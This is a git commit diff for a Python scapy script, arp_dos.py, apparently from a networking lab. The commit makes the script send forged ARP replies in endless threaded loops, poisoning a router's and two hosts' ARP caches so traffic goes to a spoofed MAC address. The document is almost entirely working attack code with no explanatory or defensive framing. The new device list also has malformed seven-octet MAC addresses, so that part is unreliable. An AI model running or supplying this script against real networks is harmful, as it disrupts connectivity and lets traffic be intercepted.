d10f4e2c354168518137089d3111e7873c02694f
Jack <62919016+JackDunfey@users.noreply.github.com>
2024-10-31 11:39:46 -0400

    multithreading

--- arp/arp_dos.py
+++ arp/arp_dos.py
@@ -1,5 +1,6 @@
 from scapy.all import ARP, Ether, Raw, send
-
+from time import sleep
+import threading
 
 ROUTER_IP = "10.9.0.1"
 ROUTER_MAC = "02:42:0c:27:f4:f7"
@@ -8,19 +9,31 @@ SPOOF_MAC = "02:42:0c:27:f4:f8"
 
 def confuse_device(ip, hwaddr):
     arp_dev = ARP(op=2, psrc=ip, hwsrc=SPOOF_MAC, pdst=ROUTER_IP, hwdst=ROUTER_MAC)
-    ether_dev = Ether(dst=ROUTER_MAC, src=SPOOF_MAC)
+    # ether_dev = Ether(dst=ROUTER_MAC, src=SPOOF_MAC)
     arp_router = ARP(op=2, psrc=ROUTER_IP, hwsrc=SPOOF_MAC, pdst=ip, hwdst=hwaddr)
-    ether_router = Ether(dst=hwaddr, src=SPOOF_MAC)
-
-    send(ether_dev / arp_dev)
-    send(ether_router / arp_router)
-
+    # ether_router = Ether(dst=hwaddr, src=SPOOF_MAC)
+    send(arp_dev)
+    send(arp_router)
     print("Sent?")
 
+def thread_cofusion(ip_addr, hw_addr):
+    while 1:
+        confuse_device(ip_addr, hw_addr)
+        sleep(0.1)
 
 def main():
-    confuse_device("10.9.0.5", "aa:bb:cc:dd:ee:05")
-    confuse_device("10.9.0.6", "aa:bb:cc:dd:ee:06")
+    devs = [
+        ("10.9.0.5", "aa:bb:cc:dd:ee:ff:05"), 
+        ("10.9.0.6", "aa:bb:cc:dd:ee:ff:06"), 
+    ]
+    threads = []
+    for dev_info in devs:
+        thread = threading.Thread(target=thread_cofusion, args=dev_info, daemon=True)
+        threads.append(thread)
+        thread.start()
+    
+    for thread in threads:
+        thread.join()
 
 if __name__ == "__main__":
     main()
